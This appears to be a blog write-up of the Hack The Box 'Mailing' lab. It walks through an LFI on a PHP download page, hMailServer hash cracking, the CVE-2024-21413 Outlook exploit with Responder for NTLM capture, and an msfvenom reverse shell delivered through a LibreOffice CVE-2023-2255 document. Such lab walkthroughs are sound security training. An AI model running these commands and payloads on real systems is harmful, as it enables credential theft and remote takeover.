+++
title = 'Mailing'
date = 2024-11-08
draft = false
tags = ["Windows"]
category = ["htb"]
summary = "HTB - Windows - Easy"
+++

## Summary
An easy Windows Hack The Box machine, foothold achieved by exploiting a Local File Inclusion (LFI) vulnerability in a PHP page hosted on the webserver on port 80, which reveals the hMailServer configuration file. We can use then information within the config file to exploit the MonikerLink bug in Microsoft Office, allowing us to capture a NTLM hash for a user. Further investigation uncovers a vulnerability in LibreOffice and a script running with local admin privileges, which is then leveraged for privilege escalation.

# Enum

Starting off with a nmap scan to enumerate what ports are open and services are running.

## Port Scanning
```bash
┌──(fish㉿kali)-[~/htb/mailing]
└─$ IP=10.10.11.14

┌──(fish㉿kali)-[~/htb/mailing]
└─$ nmap -A -oN service-scan $IP
PORT      STATE SERVICE       VERSION
25/tcp    open  smtp          hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Mailing
110/tcp   open  pop3          hMailServer pop3d
|_pop3-capabilities: TOP UIDL USER
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp   open  imap          hMailServer imapd
|_imap-capabilities: IMAP4rev1 CHILDREN RIGHTS=texkA0001 completed NAMESPACE QUOTA OK IDLE SORT IMAP4 ACL CAPABILITY
445/tcp   open  microsoft-ds?
465/tcp   open  ssl/smtp      hMailServer smtpd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
587/tcp   open  smtp          hMailServer smtpd
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
|_ssl-date: TLS randomness does not represent time
| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
993/tcp   open  ssl/imap      hMailServer imapd
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: IMAP4rev1 CHILDREN RIGHTS=texkA0001 completed NAMESPACE QUOTA OK IDLE SORT IMAP4 ACL CAPABILITY
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  open  pando-pub?
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
65080/tcp open  msrpc         Microsoft Windows RPC


```



Scan comes back with a bunch of ports including a web server, hMailServer running on multiple ports including ones with SSL, and a hostname -- `mailing@htb`. Looking at the service scan we can break it down as follows:
```bash
25 / 465 / 587 - hMailServer smtpd
80 - Web port (mailing.htb)
110 - hMailServer pop3
135 / 139 / 445 - SMB
143 / 993 - hMailServer imapd
5985 - winrm 
```

## 80/HTTP
```bash
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://mailing.htb
|_http-server-header: Microsoft-IIS/10.0
```


![](/Screenshots/Mailing_image_1.png)
```bash
/index.php            (Status: 200) [Size: 4681]
/download.php         (Status: 200) [Size: 31]
/assets               (Status: 301) [Size: 160] [--> http://mailing.htb/assets/]
/.                    (Status: 200) [Size: 4681]
/Download.php         (Status: 200) [Size: 31]
/Assets               (Status: 301) [Size: 160] [--> http://mailing.htb/Assets/]
/Index.php            (Status: 200) [Size: 4681]
/instructions         (Status: 301) [Size: 166] [--> http://mailing.htb/instructions/]
/Instructions         (Status: 301) [Size: 166] [--> http://mailing.htb/Instructions/]
/DownLoad.php         (Status: 200) [Size: 31]
/DOWNLOAD.php         (Status: 200) [Size: 31]
/ASSETS               (Status: 301) [Size: 160] [--> http://mailing.htb/ASSETS/]
/INDEX.php            (Status: 200) [Size: 4681]
```

No vhosts found using ffuf.

```bash
┌──(fish㉿kali)-[~/htb/mailing]
└─$ ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -u $URL -H 'Host: FUZZ.mailing.htb' -fs 4681
...
```
![](/Screenshots/Mailing_image_2.png)

The webserver has a link to a pdf download with instructions on how to set up thunderbird email client and connect to the server. It also mentions a potential user `maya`. There's also a `ruy` user based on the SSL cert found during the nmap scan. The site also mentions `gregory` so we can add all three users to a users.txt file.

![](/Screenshots/Mailing_image_3.png)

![](/Screenshots/Mailing_image_4.png)
![](/Screenshots/Mailing_image_5.png)

Fuzzing for other files we might be able to include:
```bash
┌──(fish㉿kali)-[~/htb/mailing]
└─$ URL=http://mailing.htb/download.php?file=FUZZ.pdf                                                 
                                                                                                                                                    
┌──(fish㉿kali)-[~/htb/mailing]
└─$ wfuzz -c --hc 404 --hh 15 -z file,/opt/SecLists/Discovery/Web-Content/raft-small-words.txt "$URL" 
```

No luck there. Switching up wordlists gets us some hits

```bash
┌──(fish㉿kali)-[~/htb/mailing]
└─$ echo $URL
http://mailing.htb/download.php?file=FUZZ

┌──(fish㉿kali)-[~/htb/mailing]
└─$ wfuzz -c --hh 15 -z file,/opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt "$URL" 
...
000000048:   500        29 L     90 W       1213 Ch     "\\&apos;/bin/cat%20/etc/shadow\\&apos;"                                           
000000047:   500        29 L     90 W       1213 Ch     "\\&apos;/bin/cat%20/etc/passwd\\&apos;"                                           
000000784:   200        7 L      12 W       92 Ch       "..\..\..\..\..\..\..\..\windows\win.ini"                                          
000000783:   200        7 L      12 W       92 Ch       "../../../../../../../../windows/win.ini"                                          
000000782:   200        7 L      12 W       92 Ch       "../../windows/win.ini"         
```

So we have identified an LFI and we're able to return the win.ini file. We can try and find the config file for hMailServer and see if we can get the `administrator` credential.

Verified the win.ini file is  returned with burpsuite:

![](/Screenshots/Mailing_image_6.png)

Looking for the installation directory for hMailServer, based on the responses from the server if a directory exists it will return a 500 error. If a file doesn't exist it'll come back with "file not found". We should try and find the config files for the application.

![](/Screenshots/Mailing_image_7.png)

No luck looking at the default location.

![](/Screenshots/Mailing_image_8.png)

Reading through the docs ended up being pretty helpful as it usually is. Below link is to a kb article about changing the directory location emails are stored and references where the `hMailServer.ini` file exists in later version of the application.
https://www.hmailserver.com/documentation/v4.2/?page=howto_change_data_directory

![](/Screenshots/Mailing_image_9.png)
![](/Screenshots/Mailing_image_10.png)

And confirmed it's at `Program Files (x86)\hMailServer\bin\hMailServer.ini` and we can access it using the LFI to get the administrator's password hash.

```ini
[Security]
AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7
[Database]
Type=MSSQLCE
Username=
Password=0a9f8ad8bf896b501dde74f08efd7e4c
PasswordEncryption=1
Port=0
Server=
Database=hMailServer
Internal=1
```

`administrator:841bb5acfa6779ae432fd7a4e6600ba7`

After adding the hash to a file we can use hashcat to crack it. Format of the hash indicates it's an MD5 hash which should be pretty quick to crack.

```bash
┌──(fish㉿kali)-[~/htb/mailing]
└─$ hashcat administrator.hash /usr/share/wordlists/rockyou.txt -m 0     
...
841bb5acfa6779ae432fd7a4e6600ba7:homenetworkingadministrator
```

`administrator:homenetworkingadministrator`

## hMailServer

As we have the cred for the admin user, we can login with thunderbird
![](/Screenshots/Mailing_image_11.png)

No emails or anything to go off in the user's inbox or outbox but we did verify we can successfully login as `administrator@mailing.htb`.

Some research found a RCE present in Microsoft outlook discovered in early 2024. There's also a python script to exploit this in github.
https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability


---
# Foothold

The vulnerability termed #MonikerLink allows us to send a crafted URL within HTML to a victim and bypasses outlook's security controls. As we have the creds for `administrator@mailing.htb` we can send an email as that user to the other user's we identified.

We need to set up a way to capture an NTLM hash, I'm going to use responder
```bash
┌──(fish㉿kali)-[~/htb/mailing]
└─$ sudo responder -I tun0  
```

I used the script against all the users to see who would respond, `maya` was the one.

```bash
┌──(fish㉿kali)-[~/htb/mailing/CVE-2024-21413/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability]
└─$ python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url \\10.10.14.7\\test\\test2\\ --subject testing  
```


![](/Screenshots/Mailing_image_12.png)
We can then run the exploit and wait for a connection to hit responder.
![](/Screenshots/Mailing_image_13.png)

Nice! We got `maya`'s NTLM hash.

We can then save the user's hash to a file and crack it with hashcat:
```bash
┌──(fish㉿kali)-[~/htb/mailing]
└─$ hashcat maya.hash /usr/share/wordlists/rockyou.txt  
...
MAYA::MAILING:2a85834c7d9b4a68:748bf550247b2b1f737a11ffd7c98b6c:01010000000000008040cb44d5fada018f7b00de29a706cd0000000002000800340043003700530001001e00570049004e002d0042003800550055004a00340057003500390052004f0004003400570049004e002d0042003800550055004a00340057003500390052004f002e0034004300370053002e004c004f00430041004c000300140034004300370053002e004c004f00430041004c000500140034004300370053002e004c004f00430041004c00070008008040cb44d5fada0106000400020000000800300030000000000000000000000000200000c242eb7102a5e808bbb6c3c33bf266c968f866054a12b32dc0c7918c273985df0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0037000000000000000000:m4y4ngs4ri

```

`maya:m4y4ngs4ri`

Now that we have a user's password we can try to interact with the SMB server hosted on the victim box.
```bash
┌──(fish㉿kali)-[~/htb/mailing]
└─$ smbmap -u maya -p m4y4ngs4ri -H mailing.htb
...
```
![](/Screenshots/Mailing_image_14.png)

Find we have read,write access to the share `Important Documents`.
![](/Screenshots/Mailing_image_15.png)
Nothing in the share it seems. But we do have the ability to add files to the system. 
![](/Screenshots/Mailing_image_16.png)

We saw port 5985 (winrm) was open during our initial nmap service scan. We can use crackmapexec to verify we have access to the server:
![](/Screenshots/Mailing_image_17.png)

And we do! We can use `evil-winrm` to access the host
```bash
┌──(fish㉿kali)-[~/htb/mailing]
└─$ evil-winrm -i mailing.htb -u maya -p m4y4ngs4ri
```
![](/Screenshots/Mailing_image_18.png)

We can then grab the user flag from `maya`'s Desktop.

![](/Screenshots/Mailing_image_19.png)

Evilwinrm gives us the ability to natively upload files which is a convenient feature. Uploaded winpeas to `Maya`'s desktop for priv esc enumeration
.
![](/Screenshots/Mailing_image_20.png)


## Exploits
https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability

--- 
# PrivEsc

Linpeas doesn't find much, we can check out the scripts `maya` runs to interact with their email inbox.
![](/Screenshots/Mailing_image_21.png)

The only other thing that stands out is within `Program files` and that's `LibreOffice` which isn't usually installed by default.

Looking at one of the readme files, show's it's running 7.4.

![](/Screenshots/Mailing_image_22.png)

Fairly recent CVE affecting 7.4 - https://nvd.nist.gov/vuln/detail/CVE-2023-2255

>Improper access control in editor components of The Document Foundation LibreOffice allowed an attacker to craft a document that would cause external links to be loaded without prompt. In the affected versions of LibreOffice documents that used "floating frames" linked to external files, would load the contents of those frames without prompting the user for permission to do so. This was inconsistent with the treatment of other linked content in LibreOffice. This issue affects: The Document Foundation LibreOffice 7.4 versions prior to 7.4.7; 7.5 versions prior to 7.5.3.

There's also an exploit on github >> https://github.com/elweth-sec/CVE-2023-2255
We can craft a malicious .odt file, upload it to the host, and have it execute a reverse shell for us.

```bash
┌──(fish㉿kali)-[~/htb/mailing/CVE-2023-2255]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=9001 -f exe -o python.exe 
```

![](/Screenshots/Mailing_image_23.png)

While enumerating the SMB shares earlier, I noticed any files that were added to the directory `C:\Important Documnets` would disappear shortly after. 

We can guess that there might be a script being executed on files in that directory. Placing our `output.odt` file and setting up our nc listener gives us a callback as the `localadmin` user.


![](/Screenshots/Mailing_image_24.png)

## Exploits
https://nvd.nist.gov/vuln/detail/CVE-2023-2255
https://github.com/elweth-sec/CVE-2023-2255
---
